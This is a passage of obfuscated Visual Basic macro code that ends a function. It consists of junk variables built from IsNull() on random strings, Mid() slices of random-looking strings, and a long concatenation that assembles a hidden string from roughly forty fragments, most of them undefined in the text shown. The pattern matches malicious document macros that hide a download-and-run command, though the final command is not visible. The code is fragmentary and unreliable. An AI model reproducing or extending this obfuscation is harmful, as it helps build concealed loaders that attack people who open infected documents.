RTKWRq = IsNull("TVPhdfnjDRYRfT") + IsNull("jwwMoKJWANDX") + IsNull("PBKjCjhco") + IsNull("JBAjjPdQ") + IsNull("AUroDozjJw") + IsNull("TaHZQBGpP") + IsNull("lGumnLnidHXzjX")
fYjsPjLvjDY = IsNull("NfACMvfHtOWV") + IsNull("UDtiaIKqJn") + IsNull("NZkvQQNYRdiW") + IsNull("VqcJIHU") + IsNull("mojtcWtDBwE") + IsNull("QpmKkqcBzDrmj") + IsNull("MkjBiBTDakABn")
QDAwRC = Mid("jJQf1TjARC8uwkd5RMBQDGmG%NbC", 17, 9)
SKOvNFkz = IsNull("YNGuCzYdYqitaP") + IsNull("InBaPNwCQdM") + IsNull("jrsWtkj") + IsNull("oAuMvMdVvFRMO") + IsNull("wjwGHjbLqRqusl") + IsNull("UoJuWqItoiCj") + IsNull("HKLAqitIanc")
muzotoLZA = IsNull("XlCIFjpEa") + IsNull("JqpnVunjWsUAi") + IsNull("KMjMufPzzzC") + IsNull("TXrbKMFcShwGV") + IsNull("AQAMvWGbzsC") + IsNull("JvYKqpkcaQo") + IsNull("hHvCIdQZrQfwwn")
BZvQFOh = IsNull("RdJcVBU") + IsNull("paQIRrHppHbFw") + IsNull("DfGqEJs") + IsNull("uAjuFNzRTd") + IsNull("rljuDiwaDTTM") + IsNull("EPZdWfzKzR") + IsNull("PbXmuqYnzXE")
drItsELHqA = Mid("YEjfHmlvdpAZwTEvPBmT4I", 12, 3)
kdfjCjclLo = IsNull("jmrZwZi") + IsNull("JDIqGWs") + IsNull("jbFinbE") + IsNull("TcdksQZLD") + IsNull("EqjqpWzElwAn") + IsNull("DwNwWsIQ") + IsNull("hZGWvzK")
XcaGZG = IsNull("JQEpPTs") + IsNull("JoVCjwSAwtQ") + IsNull("uwYiVtIJUYNfM") + IsNull("wBEoZitm") + IsNull("pSnBUzITtV") + IsNull("INrWUVKjHkbqp") + IsNull("wQwKUlwHajP")
AlPoNS = IsNull("iwmURCUsljfjq") + IsNull("RfTZmfU") + IsNull("SvUAIJk") + IsNull("aBusUEAomw") + IsNull("DkJchObHaDVLfY") + IsNull("drAQtKHSIio") + IsNull("lNiinplQRJSnlj")
KHirKLzaWG = Mid("G24p5ikQE1CwEpplrIr%=slW1tkVO79FSE", 14, 9)
ijdwXsOwXK = IsNull("soKLFTJVwkKi") + IsNull("DTJikOcwZV") + IsNull("MJZjuAmIGmdW") + IsNull("vfHjTdNGNq") + IsNull("SndqUnjSS") + IsNull("wwtabwzBbha") + IsNull("kiFGvfvIbzSJRH")
zuFVzZa = IsNull("BRGSdmVRMP") + IsNull("qojfdzonQOtOLc") + IsNull("jdsVnUvDahj") + IsNull("ULjLkIIYCzz") + IsNull("bcVwHICvpzDrYr") + IsNull("cukFzwXTbjC") + IsNull("FCEcldwt")
zEhqzuEA = IsNull("wnTDKEzzjO") + IsNull("sfQFmJq") + IsNull("DulOrEXKzz") + IsNull("kJTaBNIiQtm") + IsNull("VspmQrWMISwE") + IsNull("LZcwntwwFdw") + IsNull("FPrdfZbQIP")
slwjpwrqW = Mid("nJE3EcYiUt %GwGUtZLdUS24ffiEo4pCWTjjk53MKNT5n5Lf", 11, 11)
BwbwlU = IsNull("zzwSikmX") + IsNull("smsjfiSs") + IsNull("zDJtREz") + IsNull("slVSNczRcwnmSM") + IsNull("vToQQZXZJsbw") + IsNull("BFfsThrBCqiKu") + IsNull("DhfFjnSNZ")
HLWDGDJjMNvf = lbvtj + jTZzqEaC + DVtXEfRp + rpoULrJGWb + KXntqkHujlj + kTjDuZjsYF + YwNfaGn + zRAmlriEAXP + slwjpwrqW + KHirKLzaWG + YlSUwIAzYwW + doQYZTO + OniWOKGG + tjGkDSbYtM + MlQjB + EwnDfumX + kqrriD + nYqMjwfEK + iHtsQt + uvKbfQubq + LozrXfqNzh + PaRqHvdRJh + IWdzDbhmar + BnbpohziX + PWJmwd + wiqzjiX + wdCaNm + btzGhaZzhT + APfOiZOrF + TdVqXjJwpU + drItsELHqA + QDAwRC + WGALbza + pdjGVUOUp + jFaJqSl + wOdwc + cWFkBbItCl + LSWsjUGTftG
dojXVLLZm = ("IQWRuTlUktdK" + "VKTrins" + "XnjCEkJV" + "qRsdmwjQkmzSi" + "vTiNNBTjlt" + "kdqOpjbzuC") + ("RcjMnbuB" + "qpTkjWWwTVKfwF" + "UpBuCWT" + "RjBFiANsmkzhv" + "GfTMffYs" + "TWhrwZzwYXBC")
BiQsvFdYu = ("XFLjWaqqnOYBhj" + "JPSmmbKuHEwCUk" + "vUmUwbjPDY" + "hjmdzAhv" + "qKmHXNLDiZYV" + "OTEONkUd") + ("PNitbIdFwVZwil" + "izlQcldAmaVT" + "lnzaIruYdi" + "CaYdCwIfhWjQ" + "DAOmMsSGpEUIXw" + "rqJBSzNCMzwqS")
plCBXzWId = ("MkLfNWEV" + "zToqNizwqwB" + "OCAQDBSkYcjOi" + "QHTAjHdTswBupT" + "AjKbUwiLPKU" + "kGUmZHQRpipS") + ("JvJBPJMzKYwWmO" + "hwEpLVtMYMbmYB" + "VqrhLCZJzBIn" + "hYPntRjtZA" + "YPilooWn" + "ZCFiFCvImFoCiT")
fzwosGSrw = ("lIwUoVLiVpAfS" + "hrVaHULDqvDl" + "AdjiiGPtwGbUR" + "KhsTAhMGBkrkbi" + "RARCdKBoKRYC" + "lluGpZBWwcDDf") + ("cvnwikMiFKRojI" + "hCbiUVPqluCdL" + "YOwzQZtXS" + "RfGfjoBpscRZbZ" + "ZMECEcHA" + "hwTqTjAJ")
jhNpOkHws = ("liCwmZmr" + "oVORKiuw" + "VKWIcHquLVKcz" + "LQWRJjK" + "EcWMoVPCKTlTb" + "pcFuHsNQjkqP") + ("BoMlOdb" + "ulQSViJ" + "qqdddatM" + "bRfnvmVZS" + "OwiWqzbvq" + "bmNEGquMlZauA")
WnLvSzzut = ("PuMITni" + "fDWmoEa" + "FrJnsnUzLjfD" + "vruijzKt" + "aZHXvqijwGVl" + "HlGKbZOwkHasjL") + ("EFGQnXRkfVs" + "TbkYiYBjJcZ" + "kflqShfLiC" + "tAEzWqBapjv" + "UzirThcSbjkfIm" + "SwpjwRwrYia")
itICjmpkQ = ("jqLdCjDMQZpkP" + "bzCzdYIJMtDi" + "ZwzqXVji" + "iCvitiIF" + "udZakkrGsjZd" + "aTYdQSiRP") + ("ATVzBvfdBHHJ" + "lwMNwRd" + "IiLccJPOpWUiwY" + "OkqLNFYV" + "ROnfDEjA" + "jsoJXZlPOMkn")
iINrzcIFP = ("kJAKNWkKknTsPj" + "ENRZzqMlX" + "FZoFbbuVmIfIN" + "PfEbzTlt" + "XtPqfSDXXdWI" + "vEILZWcXovAGKR") + ("knDCMsQMMkPD" + "kHfqCSjzSluO" + "JjzPkVBQn" + "aUwEfswbKTtn" + "QJDrhnSCJowj" + "OwAtCSzXFWFO")
End Function
